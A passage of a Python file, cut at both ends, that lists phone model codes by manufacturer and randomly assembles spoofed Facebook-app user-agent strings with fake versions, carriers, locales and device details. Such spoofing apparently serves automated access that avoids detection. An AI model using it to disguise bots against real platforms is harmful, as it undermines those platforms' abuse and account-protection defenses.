V720","W_V730","W_V745","W_V750","W_V750BN","W_V755","W_V760","W_V770","W_V780","W_V800","W_V820","W_V830","W_V840","W_V850","W_V851","W_V860","W_V870","W_V880","WC300","WC300SN","WIKO_T3","WIKO_T10","WIKO_T20","WIKO_T30","WIKO_T40","WIKO_T50","WIKO_T60","WIKO_X30","WIKO_X50","WIKO_X70"],
"Itel": ["A05","A05S","A06","A11","A12","A13","A14","A15","A16","A17","A18","A18S","A20","A21","A22","A23","A24","A25","A26","A31","A32","A33","A34","A35","A36","A37","A40","A41","A42","A43","A44","A45","A46","A47","A48","A49","A50","A51","A52","A53","A54","A55","A56","A57","A58","A60","A60S","A61","A62","A63","A64","A65","A66","A70","A70S","A71","A72","A73","A80","A80S","A81","A82","A83","A84","A90","A90S","A91","A92","A93","A94","A95","L5002","L5004","L5006","L5007","L5008","L5009","L5503","L5505","L5506","L5507","L5508","L5509","L6002","L6003","L6004","L6005","L6006","L6007","L6502","L6503","L6504","L6505","L6506","L6507","P11","P12","P13","P13_PLUS","P15","P16","P17","P32","P33","P36","P37","P38","P40","P40_PLUS","P41","P42","P43","P51","P52","P53","P55","P56","P58","P60","P61","P62","P63","P65","P66","P70","P80","S11","S12","S13","S13_PRO","S15","S16","S17","S18","S21","S22","S23","S23_PLUS","S24","S31","S32","S33","S41","S42","S43","S51","S52","S61","S62","S63","S64","S65","S66","S67","S68","S71","S72","S73","S74","S75","S76","S77","S78","S79","S80","S81","S82","S83","S84","S85","S86","S87","S88","S89","S90","S91","S92","S93","S94","S95","VISION1","VISION1_PLUS","VISION2","VISION2S","VISION3","VISION3_PLUS","VISION3_TURBO","VISION5","VISION5_PLUS","VISION5_PRO","VISION6","VISION7","VISION8","VISION9","VISION10","VISION11","VISION12","VISION13","VISION14","VISION15","VISION16","VISION17","VISION18","VISION19","VISION20"],
"Vivo": ["PD0801","PD0802","PD0803","PD0810","PD0816","PD0820","PD0824","PD0830","PD0835","PD0901","PD0902","PD0903","PD0910","PD0916","PD0920","PD0924","PD0930","PD0935","PD1001","PD1002","PD1003","PD1004","PD1010","PD1016","PD1020","PD1024","PD1030","PD1035","PD1101","PD1102","PD1103","PD1106","PD1110","PD1116","PD1120","PD1124","PD1130","PD1135","PD1201","PD1203","PD1206","PD1210","PD1216","PD1220","PD1224","PD1227","PD1230","PD1235","PD1301","PD1304","PD1304A","PD1304B","PD1308","PD1311","PD1316","PD1320","PD1330","PD1401","PD1401A","PD1401B","PD1403","PD1408","PD1410","PD1419","PD1421","PD1425","PD1428","PD1430","PD1501","PD1501A","PD1503","PD1505","PD1510","PD1515","PD1522","PD1523","PD1524","PD1526","PD1530","PD1535","PD1601","PD1602","PD1603","PD1605","PD1610","PD1612","PD1613","PD1616","PD1619","PD1621","PD1624","PD1628","PD1630","PD1701","PD1705","PD1708","PD1709","PD1710","PD1718","PD1721","PD1723","PD1728","PD1730","PD1731","PD1732","PD1735","PD1736","PD1801","PD1801A","PD1803","PD1805","PD1806","PD1811","PD1813","PD1814","PD1818","PD1821","PD1824","PD1829","PD1831","PD1832","PD1836","PD1838","PD1901","PD1901IN","PD1902","PD1904","PD1906","PD1907","PD1910","PD1911","PD1913","PD1914","PD1916","PD1918","PD1920","PD1921","PD1922","PD1923","PD1924","PD1926","PD1930","PD1932","PD1936","PD1941","PD1945","PD1950","PD1955","PD1962","PD1970","PD1981","PD1986","PD1990","PD2001","PD2005","PD2011","PD2020","PD2023","PD2024","PD2025","PD2031","PD2045","PD2047","PD2056","PD2061","PD2072","PD2073","PD2078","PD2080","PD2101","PD2102","PD2103","PD2111","PD2114","PD2120","PD2123","PD2130","PD2138","PD2140","PD2150","PD2163","PD2170","PD2185","PD2193","PD2201","PD2218","PD2227","PD2230","PD2240","PD2250","PD2260","PD2270","PD2280","PD2290","PD2301","PD2313","PD2324","PD2330","PD2340","V1401","V1501","V1502","V1601","V1603","V1606","V1701","V1702","V1703","V1704","V1705","V1713","V1716","V1720","V1721","V1723","V1724","V1730","V1731","V1732","V1735","V1736","V1739","V1740","V1741","V1742","V1743","V1744","V1749","V1750","V1801","V1803","V1806","V1811","V1813","V1814","V1816","V1818","V1820","V1824","V1829","V1831","V1832","V1836","V1838","V1901","V1902","V1904","V1906","V1907","V1910","V1911","V1913","V1914","V1916","V1918","V1920","V1921","V1923","V1924","V1926","V1930","V1932","V1936","V1941","V1945","V1950","V1955","V1962","V1970","V1981","V1986","V1990","V2023","V2025","V2031","V2045","V2056","V2061","V2072","V2073","V2080","V2101","V2102","V2103","V2111","V2114","V2120","V2123","V2130","V2138","V2140","V2150","V2163","V2170","V2185","V2193","V2201","V2218","V2227","V2230","V2240","V2250","V2260","V2270","V2280","V2290","V2301","V2315","V2320"],
"ASUS": ["A001","A002","A003","A006","A68","A80","AI2202","AI2202_A","AI2202_B","AI2202_C","AI2302","AI2302_A","AI2302_B","AI2302_C","AI2401","AI2401_A","AI2401_B","AI2401_C","I001D","I001DA","I001DC","I001DE","I001DI","I003D","I003DA","I003DD","I003DI","I004D","I004DA","I004DC","I005D","I005DA","I005DC","I005DI","I006D","I006DA","I006DC","I006DI","I007D","I007DA","I007DC","I007DI","Z00A","Z00AD","Z00D","Z00ED","Z00L","Z00LD","Z00MD","Z00RD","Z00T","Z00UD","ZB450KL","ZB452KG","ZB500KL","ZB501KL","ZB520KL","ZB553KL","ZB555KL","ZB570TL","ZB601KL","ZB602KL","ZB631KL","ZB633KL","ZC451TG","ZC500TG","ZC520TL","ZC521TL","ZC553KL","ZC554KL","ZC600KL","ZD551KL","ZD552KL","ZD553KL","ZD570KL","ZD600KL","ZE500CL","ZE500KL","ZE520KL","ZE550KL","ZE551ML","ZE552KL","ZE553KL","ZE554KL","ZE600KL","ZE601KL","ZE620KL","ZS520KL","ZS530KL","ZS550KL","ZS571KL","ZS590KS","ZS600KL","ZS620KL","ZS630KL","ZS631KL","ZS660KL","ZS661KS","ZS670KS","ZS671KS","ZS673KS","ZS675KW","ZS676KS","ZS677KS","ZS678KS","ZS680KS","ZS681KS"],
"Symphony": ["AppShellVer","Atom II","G10","G10 Plus","G100","helio 30","i110","i120","i15","i18","i20","i21","i25","i30","i65","I68","i72","i74","i75","i80","i85","i97","Innova 10","Innova 30","iNova","P11","P7","P7 Pro","P9","PD1","Play","R100","R30","Roar A50","Roar E80","Roar V150","Roar V20","Roar V78","Roar V95","SymTab 20","SymTab 25","SymTab 50","SymTab 60","T8Q","V102","V105","V120","V128","V130","V140","V141","V142","V145","V155","V75","V75m","V80","V92","V94","V96","V97","V98","V99","W140","W16","W68","W72","W82","W90","Xplorer","Z10","Z12","Z18","Z22","Z30","Z30 Pro","Z32","Z40","Z45","Z50","Z60","Z60 Plus","Z9","ZVII","ZVIII"],
"Xiaomi": ["21061110AG","21091116AG","21121210G","2201116PG","2201116SC","2201116SG","2201116SI","2201117PG","2201117SC","2201117SG","2201117SI","22021211RG","22031116AI","22031116SC","22031116SG","22031116SI","220333QPG","22041211AC","22041211AG","22041211AI","22041216G","22041216UG","22041216SC","22041216SG","22041216SI","22061218C","22061218G","22061218I","2207117BPG","220733SPH","220733SPI","22081212C","22081212G","22081212SC","22081212SG","22081212SI","2210129SC","2210129SG","2210129SI","22101320I","22101320SC","22101320SG","22101320SI","22111317PG","22111317C","22111317G","22111317I","23013PC75G","23013PN0DC","23013PN0DG","23013PN0DI","23021PNC0DC","23021PNC0DG","23021PNC0DI","23021RAAEC","23021RAAEG","23021RAAEI","23043PND5C","23043PND5G","23043PND5I","23049PCD8G","23054PNC09C","23054PNC09G","23054PNC09I","23076PN4DC","23076PN4DG","23076PN4DI","23104PN3EC","23104PN3EG","23104PN3EI","23104PN5DC","23104PN5DG","23104PN5DI","23106RN0DA","23106RN0DG","23106RN0DI","23113RKC6C","23113RKC6G","23113RKC6I","23116PN5BC","23116PN5BG","23116PN5BI","23127PN0CC","23127PN0CG","23127PN0CI","23129RA5FC","23129RA5FG","23129RA5FI","2312CRAD3C","2312CRAD3G","2312CRAD3I","2312FRAFDI","2401FPN0DC","2401FPN0DG","2401FPN0DI","2402FPN0EC","2402FPN0EG","2402FPN0EI","24031PN0DC","24031PN0DG","24031PN0DI","24031PN0EC","24031PN0EG","24031PN0EI","24031PN3DC","24031PN3DG","24031PN3DI","2405CPX3DC","2405CPX3DG","2405CPX3DI","2405CPCFBG","24069PC21C","24069PC21G","24069PC21I","2407FPN8EC","2407FPN8EG","2407FPN8EI","24095PCADG","24108PCE2I","24117RK2CG","24122RKC7G","25028PC03G","25028PC03I","25053PC47G","25062PC34G","25078PC3EG","M1604K10A","M1604K10G","M1604K10I","M1806E7TG","M1808D2TG","M1903F10A","M1903F10G","M1903F10I","M2001J11B","M2001J11C","M2001J11G","M2002J11I","M2003J11C","M2003J11G","M2003J11I","M2004J11G","M2004J19PI","M2006C3MI","M2006J11C","M2006J11G","M2006J11I","M2007J20CI","M2007J20CG","M2010J19CG","M2010J19GC","M2011J18C","M2011J18G","M2011J18I","M2011K2C","M2011K2G","M2011K2I","M2012K11AG","M2101K9C","M2101K9G","M2101K9I","M2102J20SG","M2102K1C","M2102K1G","M2102K1I","M2103K19PI","M2104K10AC","M2104K10AG","M2104K10AI","MZB8741IN","MZB8742IN","MZB8743IN","MZB8744IN","MZB8745IN","MZB8746IN","MZB9011IN","MZB9012IN","MZB9013IN"],}

def ___UPA___():
    face_choice = random.choice(["fb_ver_type1","fb_ver_type2","fb_ver_type3","fb_ver_type4","fb_ver_type5","fb_ver_type6","fb_ver_type7","fb_ver_type8"])
    facx_choice = random.choice(["fb_ver_type1","fb_ver_type2","fb_ver_type3","fb_ver_type4","fb_ver_type5","fb_ver_type6","fb_ver_type7","fb_ver_type8"])    
    if face_choice == "fb_ver_type1":culkani = f"{str(random.randint(10,100))}.0.0.{str(random.randint(4000,5000))}"
    if face_choice == "fb_ver_type2":culkani = f"{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))}"
    if face_choice == "fb_ver_type3":culkani = f"{str(random.randint(10,100))}.0.0.{str(random.randint(1,8))}.{str(random.randint(40,150))}"
    if face_choice == "fb_ver_type4":culkani = f"{str(random.randint(10,432))}.0.0.{str(random.randint(11,99))}.{str(random.randint(1,200))}"
    if face_choice == "fb_ver_type5":culkani = f"{str(random.randint(191,505))}.{str(random.randint(0, 0))}.{str(random.randint(0, 0))}.{str(random.randint(39,69))}.{str(random.randint(64,154))}"
    if face_choice == "fb_ver_type6":culkani = f"{str(random.randint(100,450))}.{str(random.randint(0,0))}.{str(random.randint(0,0))}.{str(random.randint(1,40))}.{str(random.randint(10,150))}"
    if face_choice == "fb_ver_type7":culkani = f"{str(random.randint(11,77))}.0.0.{str(random.randrange(9,49))}{str(random.randint(11,77))}"
    if face_choice == "fb_ver_type8":culkani = f"{str(random.randint(111,555))}.0.0.{str(random.randrange(9,49))}{str(random.randint(11,77))}"
    if facx_choice == "fb_ver_type1":culkanix = f"{str(random.randint(10,100))}.0.0.{str(random.randint(4000,5000))}"
    if facx_choice == "fb_ver_type2":culkanix = f"{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))}"
    if facx_choice == "fb_ver_type3":culkanix = f"{str(random.randint(10,100))}.0.0.{str(random.randint(1,8))}.{str(random.randint(40,150))}"
    if facx_choice == "fb_ver_type4":culkanix = f"{str(random.randint(10,432))}.0.0.{str(random.randint(11,99))}.{str(random.randint(1,200))}"
    if facx_choice == "fb_ver_type5":culkanix = f"{str(random.randint(191,505))}.{str(random.randint(0, 0))}.{str(random.randint(0, 0))}.{str(random.randint(39,69))}.{str(random.randint(64,154))}"
    if facx_choice == "fb_ver_type6":culkanix = f"{str(random.randint(100,450))}.{str(random.randint(0,0))}.{str(random.randint(0,0))}.{str(random.randint(1,40))}.{str(random.randint(10,150))}"
    if facx_choice == "fb_ver_type7":culkanix = f"{str(random.randint(11,77))}.0.0.{str(random.randrange(9,49))}{str(random.randint(11,77))}"
    if facx_choice == "fb_ver_type8":culkanix = f"{str(random.randint(111,555))}.0.0.{str(random.randrange(9,49))}{str(random.randint(11,77))}"
    if face_choice == "fb_ver_type1":haga_result = str(random.randint(4000000,5000000))
    if face_choice == "fb_ver_type2":haga_result = str(random.randint(1111111,9999999))
    if face_choice == "fb_ver_type3":haga_result = str(random.randint(4100000,4999999))
    if face_choice == "fb_ver_type4":haga_result = str(random.randint(90000000,99999999))
    if face_choice == "fb_ver_type5":haga_result = str(random.randint(111111111,999999999))
    if face_choice == "fb_ver_type6":haga_result = str(random.randint(10000000,66666666))
    if face_choice == "fb_ver_type7":haga_result = str(random.randint(1111111,9999999))
    if face_choice == "fb_ver_type8":haga_result = str(random.randint(1111111,7777777))
    if facx_choice == "fb_ver_type1":haga_por_result = str(random.randint(4000000,5000000))
    if facx_choice == "fb_ver_type2":haga_por_result = str(random.randint(1111111,9999999))
    if facx_choice == "fb_ver_type3":haga_por_result = str(random.randint(4100000,4999999))
    if facx_choice == "fb_ver_type4":haga_por_result = str(random.randint(90000000,99999999))
    if facx_choice == "fb_ver_type5":haga_por_result = str(random.randint(111111111,999999999))
    if facx_choice == "fb_ver_type6":haga_por_result = str(random.randint(10000000,66666666))
    if facx_choice == "fb_ver_type7":haga_por_result = str(random.randint(1111111,9999999))
    if facx_choice == "fb_ver_type8":haga_por_result = str(random.randint(1111111,7777777))
    fbrv = random.choice([f"{str(random.randint(111111111,999999999))}","0"])
    mzs = random.choice([f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}",f"{random.randint(9, 16)}"])
    chrome_version = f"{random.randint(90, 114)}.0.{random.randint(0, 9999)}.{random.randint(0, 99)}"
    density = random.choice(["1.0", "1.25",  "1.2506", "1.278", "1.5", "1.625", "1.75", "1.8", "1.875", "2.0", "2.125", "2.2", "2.25", "2.375", "2.5", "2.75", "2.8", "2.9", "2.29375", "3.0", "3.25", "3.5", "3.75", "3.8", "4.0"])
    build = random.choice(["SP1A.", "TP2A.", "TP1A.", "RKQ1.", "RP1A.", "TQ3A.", "TD2A.", "TD4A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    width = random.choice(["420","720","732","800","1080","1280","1440","1612","1920","2130","2131","2160","2400","2340","2392","2560","2640","3200"])
    height = random.choice(["420","720","732","800","1080","1280","1440","1612","1920","2130","2131","2160","2400","2340","2392","2560","2640","3200"])
    buildx = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
    ver = f"{random.randint(4,16)}.{random.randint(0,9)}.{random.randint(0,9)}"
    number = str(random.randint(7,24))+str(random.randint(1,12))+str(random.randint(1,28))+"."+str(random.randint(1,70))
    manufacturer = random.choice(manufacturers)
    model = random.choice(models[manufacturer])
    fb3=random.choice(["com.facebook.katana|FB4A","com.facebook.katana|Katana-Android","com.facebook.orca|Orca-Android","com.facebook.orca|messenger-android","com.facebook.mlite|MessengerLite","com.facebook.lite|FBLite","com.oculus.twilight|OculusTwilightAndroid","com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.stella|StellaForAndroid"])
    network_type = random.choice(["LTE","5G","HSPA","WiFi","Nepal_Telecom","MTS","AREEBA","Boost Mobile","TELCEL","DIALOG","KOREK","Movistar","Telia","Orange","Claro AR","Djezzy","MTML","MetroPCS","TIGO","T-Mobile","VodafoneAL","ENTEL","Oi","Mobitel LK","I WIND","NL KPN","S COMVIQ","vodafone P","MEO","NOS","altice MEO","GLOBE","TM","BASE | Lycamobile","EE","O2 - UK","Vodafone RO","Virgin","Sprint","AT&amp-T","HT HR","null","Telenor", "Fido" "MOVO AFRICA", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Skitto", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange", "Verizon", "AT&T", "T-Mobile", "Telefonica", "EE", "Three", "U.S. Cellular", "Verizon Wireless", "Cricket", "Google Fi", "Sprint", "Metro by T-Mobile", "Boost Mobile", "TracFone Wireless", "Xfinity Mobile", "Mint Mobile", "Visible", "Republic Wireless", "Consumer Cellular", "Straight Talk", "Spectrum Mobile", "Ting", "H2O Wireless", "FreedomPop", "Boost Infinite", "Simple Mobile", "Pure Talk", "C-Spire Wireless", "SouthernLINC Wireless", "GCI Wireless", "Bluegrass Cellular", "Nex-Tech Wireless", "T-Mobile Prepaid", "Ultra Mobile", "TracFone", "Freedom Wireless", "MetroPCS", "Cellcom", "Nextel", "Cricket Wireless"])
    fban3=fb3.split('|')[1]
    fbpn3=fb3.split('|')[0]
    language_code = random.choice(["en_US","en_GB","es_ES","fr_FR","de_DE","it_IT","pt_PT","ru_RU","zh_CN","ja_JP","ko_KR","ar_AR","en_AU","en_CA","en_IN","es_LA","fr_CA","th_TH","tr_TR","pl_PL","nl_NL","da_DK","fi_FI","sv_SE","nb_NO","cs_CZ","hu_HU","el_GR","ro_RO","sk_SK","bg_BG","uk_UA","hr_HR","lt_LT","lv_LV","et_EE","sr_RS","sl_SI","he_IL","hi_IN","ms_MY","id_ID","vi_VN","tl_PH","bn_IN","pa_IN","gu_IN","ta_IN","te_IN","ml_IN","kn_IN","mr_IN","or_IN","as_IN","ne_NP","si_LK","my_MM","km_KH","lo_LA","mn_MN","kmr_TR","ku_TR","bs_BA","sq_AL","mk_MK","mt_MT","cy_GB","gd_GB","ga_IE","eu_ES","gl_ES","ca_ES","ast_ES","oc_FR","br_FR","co_FR","rm_CH","wa_BE","lb_LU","mo_MD","be_BY","uz_UZ","tk_TM","kk_KZ","ky_KG","tg_TJ","az_AZ","hy_AM","ka_GE","af_ZA","xh_ZA","zu_ZA","sw_KE","am_ET","ti_ET","so_SO","om_ET","rn_BI","rw_RW","mg_MG","ha_NG","ig_NG","yo_NG","qu_PE","ay_PE","gn_PY","dz_BT","bo_CN","ug_CN","wo_SN","yo_BJ","ar_DZ","ar_EG","ar_IQ","ar_JO","ar_KW","ar_LB","ar_LY","ar_MA","ar_OM","ar_QA","ar_SA","ar_SD","ar_SY","ar_TN","ar_AE","ar_YE","fa_IR","ps_AF","ur_PK","sd_PK","pa_PK","si_LK","bn_BD","ta_LK","ta_MY","ta_SG","zh_HK","zh_MO","zh_SG","zh_TW","my_MM","ms_BN","ms_SG","th_TH","lo_LA","km_KH","vi_VN","id_ID","jv_ID","su_ID","tl_PH","fil_PH","ceb_PH","war_PH","en_BZ","es_MX","es_GT","es_CR","es_PA","es_DO","es_VE","es_CO","es_PE","es_EC","es_CL","es_AR","es_UY","es_PY","es_BO","es_HN","es_NI","es_PR","fr_BE","fr_CH","fr_LU","fr_MC","de_AT","de_CH","de_LU","de_LI","it_CH","nl_BE","fi_AX","se_SE","is_IS","fo_FO","kl_GL","en_NZ","en_ZA","en_JM","en_BW","en_NA","en_ZM","en_MW","en_UG","en_KE","en_TZ"])
    fbop=random.choice(["1","19","20","null"])
    vers = random.choice(["1.0","2.0","3.0","4.0","4.5","5.0"])
    dal=random.choice(["1.0.0","1.1.0","1.2.0","1.3.0","1.4.0","1.5.0","1.6.0","2.0.0","2.1.0","2.2.0","2.3.0","2.4.0","3.0.0","3.1.0"])
    hardware = random.choice(["armeabi-v7a","arm64-v8a","x86","x86_64","mips:mips64:","arm64-v8a:null","arm64-v8a:","armeabi-v7a:armeabi","arm64-v8a:armeabi-v7a:armeabi","x86:armeabi-v7a","x86_64:armeabi-v7a","x86:arm64-v8a:armeabi-v7a","x86_64:arm64-v8a:armeabi-v7a","x86_64:x86:armeabi-v7a","x86_64:x86:arm64-v8a"])
    __UAX__ = random.choice([f"[FBAN/{fban3};FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]",f"[FBAN/{fban3};FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FB_FW/2;FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/{fban3};FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBCA/{hardware};]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};] FBBK/1",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]",f"[FBAN/EMA;FBBV/{haga_result};FBAV/{culkani};FBDV/{model};FBSV/{ver};FBCX/notifications_push_client_sync_graphql;FBDM/{{density={density}}}]",f"[FBAN/PAAA;FBAV/{culkani};FBDM/density={density},width={width},height={height};FBLC/{language_code};FBBV/{haga_result};FB_FW/2;FBSN/Android;FBDI/"+str(uuid.uuid4())+f";FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBSV/{ver};FBCA/{hardware};]:;]"])
    __DXX__ = random.choice([f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]",f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FB_FW/2;FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBCA/{hardware};]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};] FBBK/1",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]"])
    __FBX__ = random.choice([f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};{__UAX__}",f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result}{__UAX__}",f"[FBAN/FB4A;FBAV/{culkanix};FBBV/{haga_por_result};{__UAX__}",f"[FBAN/FB4A;FBAV/{culkanix};FBBV/{haga_por_result}{__UAX__}"])
    __FXX__ = random.choice([f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};{__DXX__}",f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result}{__DXX__}",f"[FBAN/FB4A;FBAV/{culkanix};FBBV/{haga_por_result};{__DXX__}",f"[FBAN/FB4A;FBAV/{culkanix};FBBV/{haga_por_result}{__DXX__}"])
    __DAL__ = f"Dalvik/{dal} (Linux; U; Android {ver}; {model} Build/{build}{number}) {__UAX__}"
    __DAX__ = f"Dalvik/{dal} (Linux; U; Android {ver}; {model} Build/{build}{number}) {__DXX__}"
    __M1X__ = f"Mozilla/{vers} (Linux; Android {mzs}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36"
    __M2X__ = f"Mozilla/{vers} (Linux; Android {mzs}; {model} Build/{buildx}) {__UAX__}"
    __M3X__ = f"Mozilla/{vers} (Linux; Android {mzs}; {model} Build/{buildx}) {__DXX__}"
    __IPN__ = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) 